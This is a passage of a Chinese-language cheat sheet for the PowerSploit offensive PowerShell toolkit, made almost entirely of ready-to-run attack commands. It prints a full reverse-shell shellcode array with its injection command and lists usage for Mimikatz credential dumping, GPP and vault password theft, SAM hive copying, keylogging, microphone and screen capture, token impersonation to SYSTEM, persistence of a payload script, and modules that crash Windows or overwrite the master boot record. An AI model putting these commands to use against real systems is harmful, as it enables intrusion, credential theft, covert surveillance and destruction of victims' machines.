    No encoder or badchars specified, outputting raw payload
    Payload size: 333 bytes
    Final size of powershell file: 1625 bytes
    [Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0x5,0x68,0xc0,0xa8,0x1,0x1,0x68,0x2,0x0,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x61,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x22,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xe9,0x71,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5
**注入shellcode**
    Invoke-Shellcode -Shellcode @(0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0x5,0x68,0xc0,0xa8,0x1,0x1,0x68,0x2,0x0,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x61,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x22,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xe9,0x71,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5) -Force
#### Invoke-WmiCommand
在目标主机使用wmi执行命令
**示例**
    $username = "test\Administrator"
    $password = echo "123456" | ConvertTo-SecureString -AsPlainText -Force
    $c = New-Object System.Management.Automation.PSCredential $username,$password
    Invoke-Wmicommand -Payload { 1 + 1 } -ComputerName '192.168.1.1' -Credential $Credentials
### Exfiltration
#### Get-GPPAutologon
**示例**
    Get-GPPAutologon
#### Get-GPPPassword
**示例**
    Get-GPPPassword
#### Get-Keystrokes
键盘记录
**示例**
    Get-Keystrokes -LogPath .\1.txt
#### Get-MicrophoneAudio
**通过麦克风记录声音**
**示例**
    Get-MicrophoneAudio -Path .\1.wav -Length 10
#### Get-TimedScreenshot
**屏幕记录**
**示例**
    Get-TimedScreenshot -Path .\screenshot\ -Interval 10 -EndTime 18:00
#### Get-VaultCredential
**从凭证管理器中获取凭证**
**示例**
    Get-VaultCredential
#### Invoke-CredentialInjection
**参考**
**示例**
    Invoke-CredentialInjection -UserName test -Password 123456 -NewWinLogon
#### Invoke-Mimikatz
**示例**
    Invoke-Mimikatz -DumpCreds
执行mimikaz命令
    invoke-mimikatz -Command "Privilege::Debug Sekurlsa::logonpasswords"
#### Invoke-NinjaCopy
某些文件被其他进程占用导致不能复制时，可以尝试用这个脚本来复制（例如想dump SAM文件） 需要管理员权限
**示例**
    Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\SAM.hive
#### Invoke-TokenManipulation
**参考**
>  impersonation/>
**示例** **枚举唯一 可用的令牌**
    Invoke-TokenManipulation -Enumerate
**枚举所有的令牌（包括不唯一的与通过网络登陆所创建的令牌）**
    Invoke-TokenManipulation -ShowAll
**使用SYSTEM用户的令牌创建一个进程**
    Invoke-TokenManipulation -CreateProcess "calc.exe" -Username "NT AUTHORITY\SYSTEM"
这里也可以通过ID来指定一个Token
    Invoke-TokenManipulation -CreateProcess "calc.exe" -ProcessId "1234"
那么这里会使用进程ID1234的会话来启动一个进程
**使当前的线程令牌模仿SYSTEM用户**
    Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"
#### Out-Minidump
dump指定进程完整的内存镜像
**示例**
    Out-Minidump -Process (Get-Process -Id 2612) -DumpFilePath .\
#### VolumeShadowCopyTools
卷影拷贝工具
##### Get-VolumeShadowCopy
列出所有卷影拷贝的路径 需要管理员权限 **示例**
    Get-VolumeShadowCopy
##### New-VolumeShadowCopy
新建卷影拷贝
**示例**
    New-VolumeShadowCopy -Volume C:\
##### Mount-VolumeShadowCopy
挂载卷影拷贝
**示例**
    Mount-VolumeShadowCopy -Path C:\Users\haha -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
##### Remove-VolumeShadowCopy
删除卷影拷贝
**示例**
    Remove-VolumeShadowCopy -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
### Mayhem
将此模块放在`%Systemroot%/System32\WindowsPowerShell\v1.0\Modules`
或`$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules`
#### Set-CriticalProcess
退出powershell时使系统蓝屏
**示例**
    Set-CriticalProcess
立刻退出
    Set-CriticalProcess -ExitImmediately
#### Set-MasterBootRecord
覆写主引导记录
**示例**
    Set-MasterBootRecord -BootMessage "test"
### Persistence
同mayhem放置位置
**示例**
    $ElevatedOptions = New-ElevatedPersistenceOption  -PermanentWMI -Daily -At '3 PM'
    $UserOptions = New-UserPersistenceOption -Registry -AtLogon
    Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions
### Privesc
#### Get-System
需要运行在STA模式下，启动参数-STA
**参考**
>  getsystem/>
**示例**
    get-system
**选择方式**
    get-system -Technique namedpipe/token
**恢复令牌**
    Get-System -RevToSelf
#### PowerUp
**参考**
>  guide/>
### Recon
#### Get-ComputerDetails
获取计算机信息
**示例**
    Get-ComputerDetails
#### Get-HttpStatus
扫目录脚本
**示例**
    Get-HttpStatus -Target www.example.com -Path C:\dic.txt -UseSSL
#### Invoke-Portscan
扫端口